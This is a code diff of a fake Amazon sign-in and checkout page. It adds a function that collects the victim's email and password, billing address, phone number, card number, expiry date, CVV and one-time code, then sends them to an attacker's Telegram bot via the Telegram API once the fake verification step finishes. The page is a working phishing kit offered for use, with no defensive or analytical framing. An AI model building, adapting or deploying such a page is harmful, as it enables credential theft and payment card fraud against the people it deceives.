@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Amazon Checkout</title>
+    <title>Amazon Checkout - Telegram Bot Integration</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         /* General reset */
@@ -14,7 +14,6 @@
             box-sizing: border-box;
         }
 
-        /* Body and Container */
         body {
             font-family: 'Roboto', sans-serif;
             background-color: #f3f3f3;
@@ -66,7 +65,6 @@
             color: #555;
         }
 
-        /* Inputs and Buttons */
         .input-field {
             width: 100%;
             padding: 12px;
@@ -98,36 +96,6 @@
             background-color: #e68900;
         }
 
-        .forgot-password {
-            text-align: center;
-            margin-top: 10px;
-        }
-
-        .forgot-password a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-
-        .forgot-password a:hover {
-            text-decoration: underline;
-        }
-
-        .back-to-cart {
-            display: block;
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-
-        .back-to-cart a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-
-        .back-to-cart a:hover {
-            text-decoration: underline;
-        }
-
         .payment-methods {
             display: flex;
             gap: 20px;
@@ -153,7 +121,6 @@
             display: block;
         }
 
-        /* Mobile responsive design */
         @media (max-width: 600px) {
             .container {
                 padding: 15px;
@@ -177,20 +144,16 @@
     <!-- Login Page Section -->
     <div class="section active" id="login-section">
         <div class="header">
-            <!-- Amazon logo with white background -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
             <span>Sign-In</span>
         </div>
-        <form onsubmit="showBillingPage(event)">
-            <input type="email" id="email" name="email" class="input-field" placeholder="Email or mobile phone number" required>
-            <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
+        <form id="loginForm" onsubmit="showBillingPage(event)">
+            <input type="email" id="loginEmail" name="loginEmail" class="input-field" placeholder="Email or mobile phone number" required>
+            <input type="password" id="loginPassword" name="loginPassword" class="input-field" placeholder="Password" required>
             <button type="submit" class="submit-btn">Sign-In</button>
         </form>
         <div class="forgot-password">
             <a href="#">Forgot your password?</a>
-        </div>
-        <div class="back-to-cart">
-            <p>New to Amazon? <a href="#">Create your Amazon account</a></p>
         </div>
     </div>
 
@@ -198,11 +161,10 @@
     <div class="section" id="billing-section">
         <h1>Billing Information</h1>
         <div class="header">
-            <!-- Amazon logo with white background -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
         </div>
         <div class="section-title">Enter your billing details</div>
-        <form onsubmit="showPaymentPage(event)">
+        <form id="billingForm" onsubmit="showPaymentPage(event)">
             <input type="text" id="fullName" name="fullName" class="input-field" placeholder="Full Name" required>
             <input type="text" id="address1" name="address1" class="input-field" placeholder="Address Line 1" required>
             <input type="text" id="address2" name="address2" class="input-field" placeholder="Address Line 2 (optional)">
@@ -217,13 +179,12 @@
     <!-- Payment Page Section -->
     <div class="section" id="payment-section">
         <div class="header">
-            <!-- Amazon logo with white background -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
             <span>Payment Information</span>
         </div>
         <h1>Enter your payment details</h1>
         <div class="section-title">Enter your payment details</div>
-        <form onsubmit="showOtpPage(event)">
+        <form id="paymentForm" onsubmit="showOtpPage(event)">
             <input type="text" id="cardNumber" name="cardNumber" class="input-field" placeholder="Credit Card Number" required>
             <div style="display: flex; gap: 10px;">
                 <input type="text" id="expMonth" name="expMonth" class="input-field" placeholder="MM" style="width: 45%;" required>
@@ -231,7 +192,6 @@
             </div>
             <input type="text" id="cvv" name="cvv" class="input-field" placeholder="CVV" required>
             <div class="payment-methods">
-                <!-- PayPal, Visa, and MasterCard icons with white backgrounds -->
                 <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/PayPal_logo_2014.svg" alt="PayPal" title="Pay with PayPal">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Visa_2014_logo.svg" alt="Visa" title="Pay with Visa">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/MasterCard_Logo_2019.svg" alt="MasterCard" title="Pay with MasterCard">
@@ -244,12 +204,11 @@
     <div class="section" id="otp-section">
         <h1>Enter the OTP sent to your phone number</h1>
         <div class="header">
-            <!-- Amazon logo with white background -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
             <span>OTP Verification</span>
         </div>
         <div class="section-title">Enter the 6-digit OTP</div>
-        <form onsubmit="verifyOTP(event)">
+        <form id="otpForm" onsubmit="verifyOTP(event)">
             <div style="display: flex; justify-content: space-between;">
                 <input type="text" id="otp1" name="otp1" class="input-field" maxlength="1" required>
                 <input type="text" id="otp2" name="otp2" class="input-field" maxlength="1" required>
@@ -260,13 +219,15 @@
             </div>
             <button type="submit" class="submit-btn">Verify OTP</button>
         </form>
-        <div class="resend-otp">
-            <p>Didn't receive the OTP? <a href="#" onclick="resendOTP()">Resend OTP</a></p>
-        </div>
     </div>
 </div>
 
 <script>
+    // Your Telegram Bot Token (replace with your own)
+    const botToken = 'YOUR_BOT_TOKEN';
+    // Your Telegram Chat ID (replace with your own)
+    const chatId = 'YOUR_CHAT_ID';
+
     // Function to show Billing Page after login
     function showBillingPage(event) {
         event.preventDefault();
@@ -291,6 +252,7 @@
     // Function to verify OTP
     function verifyOTP(event) {
         event.preventDefault();
+
         const otp = [
             document.getElementById('otp1').value,
             document.getElementById('otp2').value,
@@ -303,14 +265,43 @@
         const otpString = otp.join('');
         if (otpString.length === 6 && !otp.includes("")) {
             alert('OTP verified successfully!');
+            sendToTelegram();
         } else {
             alert('Please enter a valid OTP.');
         }
     }
 
-    // Function to simulate resending the OTP
-    function resendOTP() {
-        alert('A new OTP has been sent to your phone number.');
+    // Function to send all form data to Telegram bot
+    function sendToTelegram() {
+        const loginEmail = document.getElementById('loginEmail').value;
+        const loginPassword = document.getElementById('loginPassword').value;
+        const fullName = document.getElementById('fullName').value;
+        const address1 = document.getElementById('address1').value;
+        const address2 = document.getElementById('address2').value;
+        const city = document.getElementById('city').value;
+        const state = document.getElementById('state').value;
+        const postalCode = document.getElementById('postalCode').value;
+        const phone = document.getElementById('phone').value;
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expMonth = document.getElementById('expMonth').value;
+        const expYear = document.getElementById('expYear').value;
+        const cvv = document.getElementById('cvv').value;
+        const otp = [
+            document.getElementById('otp1').value,
+            document.getElementById('otp2').value,
+            document.getElementById('otp3').value,
+            document.getElementById('otp4').value,
+            document.getElementById('otp5').value,
+            document.getElementById('otp6').value
+        ].join('');
+
+        const message = `New Checkout Data:\n\nLogin Info:\nEmail: ${loginEmail}\nPassword: ${loginPassword}\n\nBilling Info:\nName: ${fullName}\nAddress: ${address1} ${address2}\nCity: ${city}\nState: ${state}\nPostal Code: ${postalCode}\nPhone: ${phone}\n\nPayment Info:\nCard Number: ${cardNumber}\nExpiry: ${expMonth}/${expYear}\nCVV: ${cvv}\nOTP: ${otp}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', url, true);
+        xhr.send();
     }
 </script>
 
